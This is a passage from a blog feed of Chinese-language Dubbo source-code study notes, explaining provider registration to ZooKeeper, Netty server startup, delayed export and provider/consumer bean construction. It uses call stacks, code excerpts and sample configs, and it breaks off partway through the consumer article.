    <content type="html"><![CDATA[<h2 id="08-提供者如何注册服务-如何延迟暴露"><a href="#08-提供者如何注册服务-如何延迟暴露" class="headerlink" title="08.提供者如何注册服务 如何延迟暴露"></a>08.提供者如何注册服务 如何延迟暴露</h2><p>provider的服务(机器ip、服务侦听端口等信息)如何让消费者找到，就是通过注册中心完成的。</p><pre><code class="hljs plain">          +---------------+          |               |    +-----&gt;Register Center&lt;-----+    |     |               |     |    |     +---------------+     |    |                           |    |                           |+---+----+                 +----+---+|        |                 |        ||consumer|                 |provider||        |                 |        |+--------+                 +--------+</code></pre><h3 id="一些问题"><a href="#一些问题" class="headerlink" title="一些问题"></a>一些问题</h3><ol><li>ServiceBean的onApplicationEvent对接spring容器refresh事件时调用了export方法，那么export方法里面干了什么呢？</li><li>provider什么时候注册且怎么像注册中心注册？</li><li>provider的server是什么时候启动并监听在相应端口上的？</li><li>provider注册后在provider内部留下了怎样的数据结构？</li></ol><p>下面会逐一解释。</p><h3 id="注册与启动server"><a href="#注册与启动server" class="headerlink" title="注册与启动server"></a>注册与启动server</h3><p>既然我们知道了provider需要向注册中心注册，provider也要启server侦听端口用来接收consumer的调用请求。那么我们先看下这个两个事情的调用堆栈吧。</p><h4 id="向注册中心注册的调用堆栈"><a href="#向注册中心注册的调用堆栈" class="headerlink" title="向注册中心注册的调用堆栈"></a>向注册中心注册的调用堆栈</h4><pre><code class="hljs java">ZookeeperRegistry.doRegister(URL) line: <span class="hljs-number">100</span>ZookeeperRegistry(FailbackRegistry).register(URL) line: <span class="hljs-number">130</span>RegistryProtocol.export(Invoker&lt;T&gt;) line: <span class="hljs-number">111</span>ProtocolFilterWrapper.export(Invoker&lt;T&gt;) line: <span class="hljs-number">53</span>ProtocolListenerWrapper.export(Invoker&lt;T&gt;) line: <span class="hljs-number">54</span>Protocol$Adpative.export(Invoker) line: not availableServiceBean&lt;T&gt;(ServiceConfig&lt;T&gt;).doExportUrlsFor1Protocol(ProtocolConfig, List&lt;URL&gt;) line: <span class="hljs-number">485</span>ServiceBean&lt;T&gt;(ServiceConfig&lt;T&gt;).doExportUrls() line: <span class="hljs-number">281</span>ServiceBean&lt;T&gt;(ServiceConfig&lt;T&gt;).doExport() line: <span class="hljs-number">242</span>ServiceBean&lt;T&gt;(ServiceConfig&lt;T&gt;).export() line: <span class="hljs-number">143</span>ServiceBean&lt;T&gt;.onApplicationEvent(ApplicationEvent) line: <span class="hljs-number">109</span></code></pre><p>ZookeeperRegistry.doRegister代码如下：  </p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doRegister</span><span class="hljs-params">(URL url)</span> </span>&#123;    <span class="hljs-keyword">try</span> &#123;    zkClient.create(toUrlPath(url), url.getParameter(Constants.DYNAMIC_KEY, <span class="hljs-keyword">true</span>));    &#125; <span class="hljs-keyword">catch</span> (Throwable e) &#123;        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RpcException(<span class="hljs-string">"Failed to register "</span> + url + <span class="hljs-string">" to zookeeper "</span> + getUrl() + <span class="hljs-string">", cause: "</span> + e.getMessage(), e);    &#125;&#125;</code></pre><p>在我们调试时url的值如下：  </p><blockquote><p>dubbo://192.168.2.3:20880/com.code260.ss.dubbo.demov.facade.service.HelloService?anyhost=true&amp;application=hello-world-app&amp;connections=50&amp;dubbo=2.0.0&amp;interface=com.code260.ss.dubbo.demov.facade.service.HelloService&amp;methods=sayHello&amp;pid=56078&amp;service.filter=tpslimiter&amp;side=provider&amp;timestamp=1590823617615</p></blockquote><h4 id="启server侦听端口的调用堆栈"><a href="#启server侦听端口的调用堆栈" class="headerlink" title="启server侦听端口的调用堆栈"></a>启server侦听端口的调用堆栈</h4><pre><code class="hljs java">NettyServer.doOpen() line: <span class="hljs-number">68</span>NettyServer(AbstractServer).&lt;init&gt;(URL, ChannelHandler) line: <span class="hljs-number">67</span>NettyServer.&lt;init&gt;(URL, ChannelHandler) line: <span class="hljs-number">63</span>NettyTransporter.bind(URL, ChannelHandler) line: <span class="hljs-number">33</span>Transporter$Adpative.bind(URL, ChannelHandler) line: not availableTransporters.bind(URL, ChannelHandler...) line: <span class="hljs-number">48</span>HeaderExchanger.bind(URL, ExchangeHandler) line: <span class="hljs-number">41</span>Exchangers.bind(URL, ExchangeHandler) line: <span class="hljs-number">63</span>DubboProtocol.createServer(URL) line: <span class="hljs-number">287</span>DubboProtocol.openServer(URL) line: <span class="hljs-number">266</span>DubboProtocol.export(Invoker&lt;T&gt;) line: <span class="hljs-number">253</span>ProtocolFilterWrapper.export(Invoker&lt;T&gt;) line: <span class="hljs-number">55</span>ProtocolListenerWrapper.export(Invoker&lt;T&gt;) line: <span class="hljs-number">56</span>Protocol$Adpative.export(Invoker) line: not availableRegistryProtocol.doLocalExport(Invoker&lt;T&gt;) line: <span class="hljs-number">153</span>RegistryProtocol.export(Invoker&lt;T&gt;) line: <span class="hljs-number">107</span>ProtocolFilterWrapper.export(Invoker&lt;T&gt;) line: <span class="hljs-number">53</span>ProtocolListenerWrapper.export(Invoker&lt;T&gt;) line: <span class="hljs-number">54</span>Protocol$Adpative.export(Invoker) line: not availableServiceBean&lt;T&gt;(ServiceConfig&lt;T&gt;).doExportUrlsFor1Protocol(ProtocolConfig, List&lt;URL&gt;) line: <span class="hljs-number">485</span>ServiceBean&lt;T&gt;(ServiceConfig&lt;T&gt;).doExportUrls() line: <span class="hljs-number">281</span>ServiceBean&lt;T&gt;(ServiceConfig&lt;T&gt;).doExport() line: <span class="hljs-number">242</span>ServiceBean&lt;T&gt;(ServiceConfig&lt;T&gt;).export() line: <span class="hljs-number">143</span>ServiceBean&lt;T&gt;.onApplicationEvent(ApplicationEvent) line: <span class="hljs-number">109</span></code></pre><p>NettyServer.doOpen()的代码如下：  </p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doOpen</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;    NettyHelper.setNettyLoggerFactory();    ExecutorService boss = Executors.newCachedThreadPool(<span class="hljs-keyword">new</span> NamedThreadFactory(<span class="hljs-string">"NettyServerBoss"</span>, <span class="hljs-keyword">true</span>));    ExecutorService worker = Executors.newCachedThreadPool(<span class="hljs-keyword">new</span> NamedThreadFactory(<span class="hljs-string">"NettyServerWorker"</span>, <span class="hljs-keyword">true</span>));    ChannelFactory channelFactory = <span class="hljs-keyword">new</span> NioServerSocketChannelFactory(boss, worker, getUrl().getPositiveParameter(Constants.IO_THREADS_KEY, Constants.DEFAULT_IO_THREADS));    bootstrap = <span class="hljs-keyword">new</span> ServerBootstrap(channelFactory);        <span class="hljs-keyword">final</span> NettyHandler nettyHandler = <span class="hljs-keyword">new</span> NettyHandler(getUrl(), <span class="hljs-keyword">this</span>);    channels = nettyHandler.getChannels();    <span class="hljs-comment">// https://issues.jboss.org/browse/NETTY-365</span>    <span class="hljs-comment">// https://issues.jboss.org/browse/NETTY-379</span>    <span class="hljs-comment">// final Timer timer = new HashedWheelTimer(new NamedThreadFactory("NettyIdleTimer", true));</span>    bootstrap.setPipelineFactory(<span class="hljs-keyword">new</span> ChannelPipelineFactory() &#123;        <span class="hljs-function"><span class="hljs-keyword">public</span> ChannelPipeline <span class="hljs-title">getPipeline</span><span class="hljs-params">()</span> </span>&#123;            NettyCodecAdapter adapter = <span class="hljs-keyword">new</span> NettyCodecAdapter(getCodec() ,getUrl(), NettyServer.<span class="hljs-keyword">this</span>);            ChannelPipeline pipeline = Channels.pipeline();            <span class="hljs-comment">/*int idleTimeout = getIdleTimeout();</span><span class="hljs-comment">            if (idleTimeout &gt; 10000) &#123;</span><span class="hljs-comment">                pipeline.addLast("timer", new IdleStateHandler(timer, idleTimeout / 1000, 0, 0));</span><span class="hljs-comment">            &#125;*/</span>            pipeline.addLast(<span class="hljs-string">"decoder"</span>, adapter.getDecoder());            pipeline.addLast(<span class="hljs-string">"encoder"</span>, adapter.getEncoder());            pipeline.addLast(<span class="hljs-string">"handler"</span>, nettyHandler);            <span class="hljs-keyword">return</span> pipeline;        &#125;    &#125;);    <span class="hljs-comment">// bind</span>    channel = bootstrap.bind(getBindAddress());&#125;</code></pre><p>getBindAddress()的返回值就是这个provider监听的地址和端口。<br>如果同一个地址和端口上有多个provider服务，那么显然server只会open一次。这个逻辑在哪里做的呢？在DubboProtocol.openServer这里，会判断server是否能取到，取不到才会createServer：   </p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">openServer</span><span class="hljs-params">(URL url)</span> </span>&#123;    <span class="hljs-comment">// find server.</span>    String key = url.getAddress();    <span class="hljs-comment">//client 也可以暴露一个只有server可以调用的服务。</span>    <span class="hljs-keyword">boolean</span> isServer = url.getParameter(Constants.IS_SERVER_KEY,<span class="hljs-keyword">true</span>);    <span class="hljs-keyword">if</span> (isServer) &#123;    ExchangeServer server = serverMap.get(key);    <span class="hljs-keyword">if</span> (server == <span class="hljs-keyword">null</span>) &#123;    serverMap.put(key, createServer(url));    &#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-comment">//server支持reset,配合override功能使用</span>    server.reset(url);    &#125;    &#125;&#125;</code></pre><h3 id="ServiceBean的export导出"><a href="#ServiceBean的export导出" class="headerlink" title="ServiceBean的export导出"></a>ServiceBean的export导出</h3><p>为什么要服务导出？</p><p>因为作者的设计意图是：</p><blockquote><p>Protocol 负责export出Exporter，Exporter 里面 包了Invoker；Protocol  也负责refer出Invoker。  </p></blockquote><p>上述设计正好对应了服务被调用与服务启动暴露的两个行为。</p><p>注册协议服务导出时会做服务注册的事情。dubbo协议服务导出时会做server创建与开启的事情。</p><p>Protocol实例(Protocol$Adaptive)会根据不同的Invoker实例来做不同的导出逻辑处理，具体看下面分析。</p><h3 id="关于服务导出的配置"><a href="#关于服务导出的配置" class="headerlink" title="关于服务导出的配置"></a>关于服务导出的配置</h3><p>服务导出分为：</p><ol><li>null(默认缺省配置，既暴露本地也暴露远程)</li><li>none（不暴露）</li><li>remote（远程暴露）</li><li>local（本地暴露）</li></ol><h3 id="远程暴露时两种协议导出过程的衔接与过程"><a href="#远程暴露时两种协议导出过程的衔接与过程" class="headerlink" title="远程暴露时两种协议导出过程的衔接与过程"></a>远程暴露时两种协议导出过程的衔接与过程</h3><h4 id="导出的两个步骤"><a href="#导出的两个步骤" class="headerlink" title="导出的两个步骤"></a>导出的两个步骤</h4><p>远程暴露时服务导出分两种或者说两个步骤(<strong>在走注册中心的情况下</strong>):</p><ol><li>注册协议导出(RegistryProtocol )。注册协议导出完成<strong>服务注册</strong>，定制unexport逻辑等。</li><li>dubbo协议(DubboProtocol)导出(DubboExporter)。dubbo协议导出完成<strong>server的创建与开启</strong>。</li></ol><p>两个过程的细节后面再描述，先看在哪衔接了这两个过程呢？要看明白衔接过程，先要看明白协议与导出逻辑的关系。</p><h4 id="协议与导出的逻辑关系"><a href="#协议与导出的逻辑关系" class="headerlink" title="协议与导出的逻辑关系"></a>协议与导出的逻辑关系</h4><p>整体原则是：Protocol实例<strong>根据不同的Invoker实例做export</strong>，可以参见Protocol接口的export方法签名<T> Exporter<T> export(Invoker<T> invoker) throws RpcException;。  </p><p>但是根据dubbo的扩展点机制，这是一个@Adaptive的接口。实际运行时会adaptive上如下几个类的实例：</p><p>注册协议发起export的点及调用栈</p><pre><code class="hljs java"><span class="hljs-comment">// ServiceConfig.doExportUrlsFor1Protocol(ProtocolConfig, List&lt;URL&gt;)</span>Exporter&lt;?&gt; exporter = protocol.export(invoker);</code></pre><p>调用栈：</p><p><strong>这个栈非常重要，表示了dubbo内部协议转换的过程</strong></p><pre><code class="hljs java">ServiceConfig.doExportUrlsFor1Protocol <span class="hljs-number">485</span>行 (Protocol$Adaptive)    ProtocolListenerWrapper        ProtocolFilterWrapper            RegistryProtocol</code></pre><p>dubbo协议发起export的点及调用栈，两种协议导出的衔接点也在此，代码如下：</p><pre><code class="hljs java"><span class="hljs-comment">// com.alibaba.dubbo.registry.integration.RegistryProtocol.doLocalExport(Invoker&lt;T&gt;)</span><span class="hljs-keyword">final</span> Invoker&lt;?&gt; invokerDelegete = <span class="hljs-keyword">new</span> InvokerDelegete&lt;T&gt;(originInvoker, getProviderUrl(originInvoker));<span class="hljs-comment">// RegistryProtocol 152行</span>exporter = <span class="hljs-keyword">new</span> ExporterChangeableWrapper&lt;T&gt;((Exporter&lt;T&gt;)protocol.export(invokerDelegete), originInvoker); <span class="hljs-comment">// RegistryProtocol 153行(Protocol$Adaptive)</span></code></pre><p>调用栈：</p><p><strong>这个栈非常重要，表示了dubbo内部协议转换的过程</strong></p><pre><code class="hljs java">RegistryProtocol <span class="hljs-number">153</span>行(Protocol$Adaptive)     ProtocolListenerWrapper        ProtocolFilterWrapper                      DubboProtocol</code></pre><p>其中<code>ProtocolListenerWrapper</code>和<code>ProtocolFilterWrapper</code>会在代码中硬编码判断根据是否是注册协议来做不同的逻辑处理。  </p><h4 id="两种导出的衔接点"><a href="#两种导出的衔接点" class="headerlink" title="两种导出的衔接点"></a>两种导出的衔接点</h4><p>为啥说在此衔接两种协议，注意看上述代码中两个invoker对应的url的协议是：</p><p>这个<strong>originInvoker对应注册中心(registry)协议</strong>。</p><p>这个<strong>invokerDelegete对应dubbo协议</strong>。</p><p>正好对应了上面的<strong>根据不同的Invoker实例做export</strong></p><p>RegistryProtocol 134行做了Invoker转换的动作，转换的逻辑来自于getProviderUrl方法，改方法会去取配置中的export字段，那么下面列出注册协议和dubbo协议对应的样例url。</p><p>注册协议url</p><blockquote><p>registry://127.0.0.1:2181/com.alibaba.dubbo.registry.RegistryService?application=hello-world-app&amp;dubbo=2.0.0&amp;export=dubbo://172.22.221.166:20880/org.simonme.dubbo.demo.provider.service.HelloService?anyhost=true&amp;application=hello-world-app&amp;dubbo=2.0.0&amp;interface=org.simonme.dubbo.demo.provider.service.HelloService&amp;loadbalance=leastactive&amp;methods=sayHello&amp;pid=7380&amp;side=provider&amp;timestamp=1584343891343&amp;pid=7380&amp;registry=zookeeper&amp;timestamp=1584343891329</p></blockquote><p>注意看上面<strong>有export=….这一段</strong>。</p><p>dubbo协议url</p><blockquote><p>dubbo://172.22.221.166:20880/org.simonme.dubbo.demo.provider.service.HelloService?anyhost=true&amp;application=hello-world-app&amp;dubbo=2.0.0&amp;interface=org.simonme.dubbo.demo.provider.service.HelloService&amp;loadbalance=leastactive&amp;methods=sayHello&amp;pid=7380&amp;side=provider&amp;timestamp=1584343891343</p></blockquote><p>这就是上面注册协议中export的字段值…</p><p>那么再思考一个问题，这个export字段值是什么时候加上去的？看下面代码即可：</p><pre><code class="hljs java"><span class="hljs-comment">// com.alibaba.dubbo.config.ServiceConfig.doExportUrlsFor1Protocol(ProtocolConfig, List&lt;URL&gt;) 483行</span>Invoker&lt;?&gt; invoker = proxyFactory.getInvoker(ref, (Class) interfaceClass, registryURL.addParameterAndEncoded(Constants.EXPORT_KEY, url.toFullString()));</code></pre><h3 id="注册中心导出细节"><a href="#注册中心导出细节" class="headerlink" title="注册中心导出细节"></a>注册中心导出细节</h3><p>导出器实例维护在哪里？</p><p>RegistryProtocol export出的Expoter实例维护在<strong>ServiceConfig.exporters</strong>中。</p><p>RegistryProtocol export出的Expoter实例是RegistryProtocol的Exporter实现的匿名内部类。  这个匿名内部类通过ExporterChangeableWrapper在doLocalExport中对接了ListenerExporterWrapper实例，ListenerExporterWrapper实例再对接了DubboProtocol的Exporter。这个地方的传递方式有点绕。</p><p>RegistryProtocol 在export的过程中已经完成DubboProtocol的export，即DubboExporter实例的构建。</p><p>RegistryProtocol export出的Expoter实例<strong>对应的invoker是JavassistProxyFactory$1,即AbstractProxyInvoker匿名内部类</strong>。该Invoker实例此时<strong>对应的协议是registry://…</strong>,可以观察其url字段得知。</p><p>详细的可以看下面这个调试信息表格：</p><table><tr><td>val$exporter</td><td>&nbsp;&nbsp;&nbsp;&nbsp;RegistryProtocol$ExporterChangeableWrapper<T>  (id=112)&nbsp;&nbsp;&nbsp;&nbsp;</td></tr><tr><td>&nbsp;&nbsp;&nbsp;&nbsp;exporter</td><td>&nbsp;&nbsp;&nbsp;&nbsp;ListenerExporterWrapper<T>  (id=126)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td></tr><tr><td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exporter</td><td>&nbsp;&nbsp;&nbsp;&nbsp;DubboExporter<T>  (id=131)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td></tr><tr><td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;invoker</td><td>&nbsp;&nbsp;&nbsp;&nbsp;ProtocolFilterWrapper$1  (id=143)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td></tr><tr><td>&nbsp;&nbsp;&nbsp;&nbsp;originInvoker</td><td>&nbsp;&nbsp;&nbsp;&nbsp;JavassistProxyFactory$1  (id=82)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td></tr></table><p>代码如下：</p><pre><code class="hljs java"><span class="hljs-keyword">public</span> &lt;T&gt; <span class="hljs-function">Exporter&lt;T&gt; <span class="hljs-title">export</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Invoker&lt;T&gt; originInvoker)</span> <span class="hljs-keyword">throws</span> RpcException </span>&#123;    <span class="hljs-comment">//export invoker</span>    <span class="hljs-keyword">final</span> ExporterChangeableWrapper&lt;T&gt; exporter = doLocalExport(originInvoker);    <span class="hljs-comment">//registry provider</span>    <span class="hljs-keyword">final</span> Registry registry = getRegistry(originInvoker);    <span class="hljs-keyword">final</span> URL registedProviderUrl = getRegistedProviderUrl(originInvoker);    registry.register(registedProviderUrl);    <span class="hljs-comment">// 订阅override数据</span>    <span class="hljs-comment">// FIXME 提供者订阅时，会影响同一JVM即暴露服务，又引用同一服务的的场景，因为subscribed以服务名为缓存的key，导致订阅信息覆盖。</span>    <span class="hljs-keyword">final</span> URL overrideSubscribeUrl = getSubscribedOverrideUrl(registedProviderUrl);    <span class="hljs-keyword">final</span> OverrideListener overrideSubscribeListener = <span class="hljs-keyword">new</span> OverrideListener(overrideSubscribeUrl);    overrideListeners.put(overrideSubscribeUrl, overrideSubscribeListener);    registry.subscribe(overrideSubscribeUrl, overrideSubscribeListener);    <span class="hljs-comment">//保证每次export都返回一个新的exporter实例</span>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Exporter&lt;T&gt;() &#123;        <span class="hljs-function"><span class="hljs-keyword">public</span> Invoker&lt;T&gt; <span class="hljs-title">getInvoker</span><span class="hljs-params">()</span> </span>&#123;            <span class="hljs-keyword">return</span> exporter.getInvoker();        &#125;        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">unexport</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-keyword">try</span> &#123;        exporter.unexport();        &#125; <span class="hljs-keyword">catch</span> (Throwable t) &#123;            logger.warn(t.getMessage(), t);            &#125;            <span class="hljs-keyword">try</span> &#123;            registry.unregister(registedProviderUrl);            &#125; <span class="hljs-keyword">catch</span> (Throwable t) &#123;            logger.warn(t.getMessage(), t);            &#125;            <span class="hljs-keyword">try</span> &#123;            overrideListeners.remove(overrideSubscribeUrl);            registry.unsubscribe(overrideSubscribeUrl, overrideSubscribeListener);            &#125; <span class="hljs-keyword">catch</span> (Throwable t) &#123;            logger.warn(t.getMessage(), t);            &#125;        &#125;    &#125;;&#125;</code></pre><h3 id="dubbo协议导出细节"><a href="#dubbo协议导出细节" class="headerlink" title="dubbo协议导出细节"></a>dubbo协议导出细节</h3><p>DubboExporter实例维护在<strong>DubboProtocol的exporterMap(声明在其父类AbstractProtocol中)</strong>。</p><p>DubboExporter 实例<strong>对应的invoker是ProtocolFilterWrapper$1,即Invoker的匿名内部类，也即对应包装了过滤器链的调用链</strong>。该Invoker实例此时<strong>对应的协议是dubbo://…</strong>,可以观察其url字段得知。</p><p>Dubbo协议导出涉及调用链的构建，server的创建与开启，具体细节可以参见《调用链如何构建的？ProtocolFilterWrapper等分析》和com.alibaba.dubbo.rpc.protocol.dubbo.DubboProtocol.export(Invoker<T>)  </p><p>com.alibaba.dubbo.rpc.protocol.dubbo.DubboProtocol.openServer(URL)  </p><p>com.alibaba.dubbo.rpc.protocol.dubbo.DubboProtocol.createServer(URL)  </p><p>注意  dubbo协议对接的server 对接到 <code>ExchangeServer</code>这一层，并没有直接对接到Netty啥的。  </p><h3 id="延迟暴露"><a href="#延迟暴露" class="headerlink" title="延迟暴露"></a>延迟暴露</h3><pre><code class="hljs java"><span class="hljs-keyword">if</span> (delay != <span class="hljs-keyword">null</span> &amp;&amp; delay &gt; <span class="hljs-number">0</span>) &#123;           Thread thread = <span class="hljs-keyword">new</span> Thread(<span class="hljs-keyword">new</span> Runnable() &#123;               <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;                   <span class="hljs-keyword">try</span> &#123;                       Thread.sleep(delay);                   &#125; <span class="hljs-keyword">catch</span> (Throwable e) &#123;                   &#125;                   doExport();               &#125;           &#125;);           thread.setDaemon(<span class="hljs-keyword">true</span>);           thread.setName(<span class="hljs-string">"DelayExportServiceThread"</span>);           thread.start();       &#125;</code></pre><p>很简单，在ServiceBean的export中做了逻辑判断，发现是延迟暴露的，另起一个线程，并先sleep delay的时间在doExport。</p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>dubbo源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[dubbo]07.提供者provider bean构建逻辑</title>
    <link href="/2020/05/17/dubbo-07.build-provider/"/>
    <url>/2020/05/17/dubbo-07.build-provider/</url>
    
    <content type="html"><![CDATA[<h2 id="07-提供者provider-bean构建逻辑"><a href="#07-提供者provider-bean构建逻辑" class="headerlink" title="07.提供者provider bean构建逻辑"></a>07.提供者provider bean构建逻辑</h2><p>Server 侧demo</p><p>启动类</p><pre><code class="hljs java"><span class="hljs-meta">@RunWith</span>(SpringJUnit4ClassRunner<span class="hljs-class">.<span class="hljs-keyword">class</span>)</span>@ContextConfiguration("/com/code260/ss/dubbo/demov/server/conf/registercenter/zookeeper/applicationContextNode1.xml")<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloServiceTestNode1</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-meta">@Test</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">testSayHello</span><span class="hljs-params">()</span></span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">try</span>        &#123;            System.out.println(<span class="hljs-string">"zookeeper注册中心demo：I am node1:-)"</span>);            System.in.read();        &#125;        <span class="hljs-keyword">catch</span> (IOException e)        &#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre><p>服务配置</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dubbo:service</span> <span class="hljs-attr">interface</span>=<span class="hljs-string">"com.code260.ss.dubbo.demov.facade.service.HelloService"</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"m00001.app001.xx.helloService"</span> <span class="hljs-attr">filter</span>=<span class="hljs-string">"tpslimiter"</span> <span class="hljs-attr">connections</span>=<span class="hljs-string">"50"</span>&gt;</span>    <span class="hljs-comment">&lt;!--     &lt;dubbo:parameter key="tps" value="5" /&gt;</span><span class="hljs-comment">        &lt;dubbo:parameter key="tps.interval" value="1000" /&gt; --&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">dubbo:service</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"m00001.app001.xx.helloService"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.code260.ss.dubbo.demov.server.service.impl.HelloServiceImpl"</span>/&gt;</span></code></pre><p>我们通过dubbo:service引用了一个HelloServiceImpl的bean，这样HelloServiceImpl对应的HelloService接口就算有一个provider了，那么dubbo:service是如何实现的？</p><p>先描述下整体流程：</p><pre><code class="hljs mermaid">graph TDA[自定义spring配置标签-格式结构-]--&gt;B[DubboNamespaceHandler对接spring自定义namespace注册标签解析器]B--&gt;C[定义DubboBeanDefinitionParser解析处理那些标签]C--&gt;D[ServiceBean对接spring的onApplicationEvent的ContextRefreshedEvent事件]D--&gt;E[ServiceBean export]</code></pre><p>涉及DubboNamespaceHandler的部分在上一篇文章中已经解释了，此处跳过。</p><h3 id="DubboBeanDefinitionParser"><a href="#DubboBeanDefinitionParser" class="headerlink" title="DubboBeanDefinitionParser"></a>DubboBeanDefinitionParser</h3><p>对接ServiceBean部分的代码：</p><pre><code class="hljs java"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ServiceBean<span class="hljs-class">.<span class="hljs-keyword">class</span>.<span class="hljs-title">equals</span>(<span class="hljs-title">beanClass</span>)) </span>&#123;            String className = element.getAttribute(<span class="hljs-string">"class"</span>);            <span class="hljs-keyword">if</span>(className != <span class="hljs-keyword">null</span> &amp;&amp; className.length() &gt; <span class="hljs-number">0</span>) &#123;                RootBeanDefinition classDefinition = <span class="hljs-keyword">new</span> RootBeanDefinition();                classDefinition.setBeanClass(ReflectUtils.forName(className));                classDefinition.setLazyInit(<span class="hljs-keyword">false</span>);                parseProperties(element.getChildNodes(), classDefinition);                beanDefinition.getPropertyValues().addPropertyValue(<span class="hljs-string">"ref"</span>, <span class="hljs-keyword">new</span> BeanDefinitionHolder(classDefinition, id + <span class="hljs-string">"Impl"</span>));            &#125;        &#125;</code></pre><p>className如果存在，则做这一段逻辑处理，如果className不存在则没有逻辑处理。</p><p>我们如果不配置class属性时，则会配置一个ref属性指向一个配置好的beanId。</p><p>如果className存在是指dubbo:service标签配置了class属性，此时自动生成ref属性。ref指向一个自动构建的bean定义。构建逻辑时候：构建RootBeanDefinition实例，从而构建BeanDefinitionHolder，最终把BeanDefinitionHolder实例放到原来beanDefinition的property中，property的名称是ref。</p><h3 id="ServiceBean"><a href="#ServiceBean" class="headerlink" title="ServiceBean"></a>ServiceBean</h3><p>该类实现了spring的ApplicationListener接口的onApplicationEvent方法，在该方法中在侦测到ContextRefreshedEvent事件时对接ServiceBean的export逻辑。详细的export逻辑会在后面文章中讲解。</p><h4 id="afterPropertiesSet"><a href="#afterPropertiesSet" class="headerlink" title="afterPropertiesSet"></a>afterPropertiesSet</h4><p>阅读ServiceBean的afterPropertiesSet方法的代码发现，有不少代码，是干什么的呢？</p><p>主要是做了一些关联配置的设置处理，包括ProviderConfig、ApplicationConfig、ModuleConfig、RegistryConfig列表、MonitorConfig、ProtocolConfig列表等</p><h4 id="destory"><a href="#destory" class="headerlink" title="destory"></a>destory</h4><p>ServiceBean实现了DisposableBean接口，实现了其destory方法，用于在销毁时触发unexport逻辑。</p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>dubbo源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[dubbo]06.消费者consumer侧 reference bean生成逻辑</title>
    <link href="/2020/05/05/dubbo-06.build-consumer-proxy/"/>
    <url>/2020/05/05/dubbo-06.build-consumer-proxy/</url>
    
    <content type="html"><![CDATA[<h2 id="06-消费者consumer侧-reference-bean生成逻辑"><a href="#06-消费者consumer侧-reference-bean生成逻辑" class="headerlink" title="06.消费者consumer侧 reference bean生成逻辑"></a>06.消费者consumer侧 reference bean生成逻辑</h2><p>client侧demo</p><pre><code class="hljs java"><span class="hljs-meta">@RunWith</span>(SpringJUnit4ClassRunner<span class="hljs-class">.<span class="hljs-keyword">class</span>)</span>@ContextConfiguration("/com/code260/ss/dubbo/demov/client/conf/registercenter/zookeeper/applicationContext.xml")<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloClientTest</span></span><span class="hljs-class"></span>&#123;     <span class="hljs-meta">@Autowired</span>    <span class="hljs-keyword">private</span> HelloService helloService;        <span class="hljs-meta">@Test</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">testSayHello</span><span class="hljs-params">()</span></span><span class="hljs-function">    </span>&#123;    <span class="hljs-keyword">this</span>.helloService.sayHello(<span class="hljs-string">"Simon"</span>);    &#125;&#125;</code></pre><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dubbo:reference</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"helloService"</span> <span class="hljs-attr">interface</span>=<span class="hljs-string">"com.code260.ss.dubbo.demov.facade.service.HelloService"</span> <span class="hljs-attr">timeout</span>=<span class="hljs-string">"3000000"</span>/&gt;</span></code></pre><p>我们通过dubbo:reference配置了一个HelloService的实现bean，这样我们在使用时就能通过Autowired直接使用helloService字段了，那么dubbo:reference是如何实现的？</p><p>先描述下整体流程：</p><pre><code class="hljs mermaid">graph TDA[自定义spring配置标签-格式结构-]--&gt;B[DubboNamespaceHandler对接spring自定义namespace注册标签解析器]B--&gt;C[定义DubboBeanDefinitionParser解析处理那些标签]C--&gt;D[ReferenceBean getobject 